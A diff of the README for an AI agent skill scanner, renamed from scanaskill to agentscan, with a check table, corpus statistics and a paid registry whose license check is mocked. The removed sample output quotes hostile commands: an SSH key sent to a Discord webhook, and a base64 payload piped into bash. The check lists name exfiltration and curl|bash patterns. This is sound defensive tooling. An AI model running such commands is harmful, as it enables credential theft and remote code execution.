@@ -1,240 +1,226 @@
-<div align="center">
+# agentscan
 
-# 🛡️ scanaskill
+**The trust layer for AI agent skills.**
 
-Deterministic security scanner for AI agent skills.
+A deterministic, local security scanner for AI agent skills — plus the
+Trusted Distribution: a curated, continuously audited package registry.
 
-Scan Claude Skills, MCP servers, Cursor rules, GitHub Actions, and other agent
-artifacts to see what they actually do before installing them.
+```bash
+pip install agentscan
 
-Offline. Pure Python stdlib. Executes nothing.
-
-[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/tests-39%20passing-brightgreen)](#)
-[![stdlib](https://img.shields.io/badge/deps-0-blueviolet)](#)
-
-</div>
-
----
-
-# Why this exists
-
-Agent skills are becoming another software dependency.
-
-They can run shell commands, install packages, clone repositories, access your
-files, or send data over the network. Most of them are installed directly from
-GitHub with very little review.
-
-Recent incidents have shown this isn't theoretical anymore.
-
-Snyk's **ToxicSkills** audit of nearly four thousand public skills found that
-over a third contained security issues, including dozens with intentionally
-malicious behavior. The **Clinejection** incident demonstrated how prompt
-injection could chain into an npm supply-chain compromise.
-
-We have tools like `npm audit`, `cargo audit`, and `pip-audit` for packages.
-
-There wasn't an equivalent for AI skills.
-
-scanaskill fills that gap.
-
-It doesn't execute anything. It doesn't try to decide whether something is
-malicious. It simply tells you what the artifact contains so you can inspect it
-before trusting it.
+agentscan scan ~/.claude/skills     # free, local, deterministic
+agentscan activate                  # Trusted Distribution license
+agentscan search                    # what's available
+agentscan install security-engineer # one command, verified
+agentscan update                    # like brew upgrade
+```
 
 ---
 
-# What we found
+## The scanner (free, open source, MIT)
 
-We scanned 4,000 randomly selected public skills from 174 repositories
-(8,850 collected, 8,414 unique after deduplication).
+Scan any skill, MCP server, or agent config for what it actually *does* —
+shell, exfiltration, secrets, supply-chain, obfuscation — before you run it
+in your agent.
+
+- **Facts, not verdicts.** Every finding is a checkable fact with
+  `file:line`. The scanner never calls anything "malicious" — that verdict
+  is yours.
+- **Deterministic, not ML.** Regex, entropy, structure. Same input, same
+  report, every time.
+- **Zero dependency, zero execution.** Pure Python stdlib. Never runs a
+  skill, never calls out, works offline.
+
+```bash
+$ agentscan scan ~/Downloads/suspicious-skill
+
+agentscan 0.4.0 — /home/you/Downloads/suspicious-skill
+scanned 1 artifact(s), 14 finding(s)
+
+  ARTIFACT  [claude-skill] auto-updater
+  CRITICAL [exfil] Local secret read piped to network
+           SKILL.md:41
+  CRITICAL [secrets] AWS Access Key
+           SKILL.md:24
+  ...
+  summary: critical=3 high=2 medium=5 low=2 info=2
+  note: findings are observed patterns, not verdicts. Review each before acting.
+```
+
+Exit codes: `0` clean · `1` findings at/above threshold · `2` usage error.
+
+### What it checks
+
+| Check | Observes |
+|---|---|
+| `shell` | bash/sh/python -c/node -e/exec/eval/subprocess invocations |
+| `filesystem` | rm -r/-f, shutil.rmtree, git reset --hard/clean/push --force, chmod 777 |
+| `network` | curl/wget/fetch/requests, URLs, credential-in-URL, IP literals, cleartext http |
+| `secrets` | 20+ token formats (AWS, GitHub, Slack, Stripe, OpenAI, Anthropic, JWT, PEM…) |
+| `license` | declared license — recognized vs. unrecognized vs. missing |
+| `supply_chain` | curl\|bash pipes, git clone, unpinned pip/npm, script downloads |
+| `prompt_patterns` | high-risk prompt-manipulation phrasing — flagged, never "detected" |
+| `exfil` | credentialed webhooks, env-in-URL, secret-read → network |
+| `obfuscation` | decode-to-execute chains, nested eval/exec, hex escapes |
+| `config_tamper` | remote MCP servers, hook commands, npm lifecycle scripts |
+
+**Artifacts detected:** `claude-skill`, `mcp-server`, `cursor-rules`,
+`context-file`, `github-actions`, `npm-package`, `generic`.
+
+### Usage
+
+```bash
+python3 -m agentscan <dir>                  # human report
+python3 -m agentscan <dir> --json           # machine-readable
+python3 -m agentscan <dir> --sarif          # SARIF 2.1.0 (GitHub code scanning)
+python3 -m agentscan <dir> --severity high  # only high+ fails exit code
+```
+
+---
+
+## The Trusted Distribution (paid)
+
+Access to curated, security-reviewed packages. Buy once (`$49`), receive a
+license key, activate, install. No dashboard, no browser login, no accounts —
+it's a developer tool.
+
+```
+Buy ($49, Polar)
+  ↓
+License key (XXXX-XXXX-XXXX)
+  ↓
+pip install agentscan
+  ↓
+agentscan activate            → POST /api/verify-license
+  ↓
+agentscan search              → GET  /api/packages
+  ↓
+agentscan install <package>   → download → sha256 → extract → install
+  ↓
+agentscan update              → like brew upgrade
+```
+
+### Architecture
+
+```
+PyPI (agentscan CLI, MIT)
+   ↓
+agentscan.baldbee.me (Next.js site + API route handlers)
+   ↓
+Polar (license verification — source of truth, no users table)
+   ↓
+agentscan-registry (private GitHub repo)
+   ├── packages/        source of truth
+   ├── packages.json    generated catalog (sha256 per package)
+   └── GitHub Releases  tarball distribution
+   ↓
+~/.agentscan/  license · installed.json · config.json · cache/
+~/.claude/skills/<package>/  installed package
+```
+
+The website and API are the same Next.js application. No separate backend,
+no database, no object storage. Git is the source of truth; GitHub Releases
+are the CDN.
+
+### Commands
+
+```bash
+agentscan activate                 # prompt for license → verify → store
+agentscan logout                   # remove local license
+agentscan whoami                   # show active license
+agentscan search                   # catalog from GET /api/packages
+agentscan install <package>        # verified install into Claude Code
+agentscan update                   # upgrade installed packages
+agentscan verify                   # signature · latest · audit · intact
+```
+
+### Local state
+
+Everything lives in `~/.agentscan/`:
+
+```
+~/.agentscan/
+  license          the activated license (JSON)
+  installed.json   {package-id: version}
+  config.json      api_url override (optional)
+  cache/           downloaded tarballs
+```
+
+### Package format
+
+A package is **not** just a skill. It may contain agents, skills, slash
+commands, templates, workflows, and knowledge:
+
+```
+security-engineer/
+  manifest.json     id, title, version, description, license, requires
+  agents/           optional agent definitions
+  skills/           SKILL.md files
+  commands/         optional slash commands
+  templates/        optional templates
+  knowledge/        reference material
+  audit.json        latest deterministic scan result
+  signature.sig     placeholder — real signing lands with the Polar milestone
+  README.md
+```
+
+`manifest.json` ships one package definition per the catalog shape:
+
+```json
+{ "packages": [ { "id": "security-engineer", "title": "Security Engineer",
+  "version": "1.0.1", "description": "…", "sha256": "…",
+  "release": "v1.0.1", "asset": "security-engineer-1.0.1.tar.gz" } ] }
+```
+
+### Status of the paid layer
+
+The API endpoints and license verification are **currently mocked**:
+
+- `POST /api/verify-license` accepts any well-formed `XXXX-XXXX-XXXX` key.
+  Real validation against Polar is the next milestone; the CLI response
+  shape (customer, plan, expiry) is already the Polar contract.
+- Package downloads are **real**: served from the private GitHub registry,
+  checksum-verified end to end.
+- `signature.sig` is a placeholder; cryptographic signing is designed in
+  (`agentscan verify` is structured to add it without CLI changes).
+
+---
+
+## The numbers (4,000 skills measured)
+
+We scanned a random sample of 4,000 unique skills across 174 public repos:
 
 | Signal | % of skills |
 |---|---|
 | No recognizable license | **93.6%** |
-| Invokes shell or interpreter | **75.3%** |
-| Supply-chain behavior (curl\|bash, unpinned installs) | **23.1%** |
+| Invokes shell / interpreter | **75.3%** |
+| Supply-chain patterns (curl\|bash, unpinned installs) | **23.1%** |
 | Credential-format strings | **14.7%** |
-| Destructive filesystem operations | **7.6%** |
+| Destructive filesystem ops | **7.6%** |
 | Exfiltration sinks | **4.2%** |
-| Prompt manipulation patterns | **3.3%** |
+| Prompt-manipulation phrasing | **3.3%** |
 | Obfuscation chains | **0.4%** |
-| High or critical findings | **18.0%** |
+| **Any high/critical finding** | **18.0%** |
 
-Almost one in five skills contained at least one high or critical finding.
-
-The complete methodology is available in
-[`CORPUS-REPORT.md`](CORPUS-REPORT.md).
+Full methodology: [`CORPUS-REPORT.md`](CORPUS-REPORT.md)
 
 ---
 
-# Installation
-
-No installation required.
+## Development
 
 ```bash
-git clone https://github.com/baldbee/scanaskill
-cd scanaskill
-python3 -m scanaskill ~/.claude/skills
+python3 -m unittest discover -s tests -v   # 49 tests
 ```
 
-Python 3.8+ only.
-
----
-
-# Usage
+Pure stdlib, Python 3.8+, works offline. To point the CLI at a local server:
 
 ```bash
-python3 -m scanaskill <dir>
-
-python3 -m scanaskill <dir> --json
-
-python3 -m scanaskill <dir> --sarif
-
-python3 -m scanaskill <dir> --severity high
-
-python3 -m scanaskill <dir> --max-findings 0
+export AGENTSCAN_API_URL=http://localhost:3100   # overrides the default API
 ```
 
-Exit codes:
+## License
 
-- **0** — no findings at or above the selected threshold
-- **1** — findings detected
-- **2** — invalid usage
-
----
-
-# Example
-
-```text
-$ python3 -m scanaskill suspicious-skill
-
-scanaskill 0.2.0
-Scanned 1 artifact
-14 findings
-
-CRITICAL  Local secret read piped to network
-SKILL.md:41
-
-curl -d @~/.ssh/id_rsa https://discord.com/api/webhooks/...
-
-CRITICAL  AWS Access Key
-SKILL.md:24
-
-AKIA...
-
-CRITICAL  base64 decode piped into shell
-SKILL.md:52
-
-echo '...' | base64 -d | bash
-
-HIGH      curl | bash
-SKILL.md:12
-```
-
----
-
-# Checks
-
-scanaskill currently looks for:
-
-- shell execution
-- filesystem operations
-- network access
-- embedded secrets and credentials
-- license information
-- supply-chain behavior
-- prompt manipulation patterns
-- exfiltration paths
-- obfuscation
-- configuration tampering
-
-Supported artifacts include Claude Skills, MCP servers, Cursor rules,
-GitHub Actions, npm packages, context files, and generic repositories.
-
----
-
-# Design
-
-### It reports observations
-
-Every finding points to a specific file and line.
-
-The scanner never labels a project as malicious or safe. Those are human
-judgments.
-
-### It is deterministic
-
-Everything is based on parsing, regexes, entropy checks, and static analysis.
-
-Running the scanner twice on the same files produces the same report.
-
-### It executes nothing
-
-No sandbox.
-
-No API calls.
-
-No telemetry.
-
-No model.
-
-It never runs the artifact being scanned.
-
-### It is built to avoid noisy reports
-
-Common placeholders such as `YOUR_API_KEY`, example secrets, environment
-variables, and license boilerplate are ignored.
-
-The test suite also includes parity tests to ensure performance optimizations
-don't change findings.
-
----
-
-# Performance
-
-Scanning a single skill is effectively instantaneous.
-
-A corpus of roughly four thousand skills completes in about four and a half
-minutes on a laptop using process parallelism.
-
-Large files are capped to keep scans predictable.
-
----
-
-# Development
-
-```bash
-python3 -m unittest discover -s tests -v
-```
-
-39 tests.
-
-Pure Python standard library.
-
----
-
-# Roadmap
-
-The scanner is free.
-
-The long-term product is verification.
-
-1. Local scanner.
-2. Public verification reports tied to commits.
-3. Continuous verification with rescans when artifacts change.
-4. Enterprise attestation for organizations.
-
-The goal is to be an independent auditor, not another skill marketplace.
-
----
-
-# License
-
-MIT © baldbee
-
----
+[MIT](LICENSE) © baldbee
 
 *Independent project. Not affiliated with Anthropic, Snyk, or any vendor.
 Patterns modeled on gitleaks/trufflehog (secrets), OWASP Agentic Top 10,
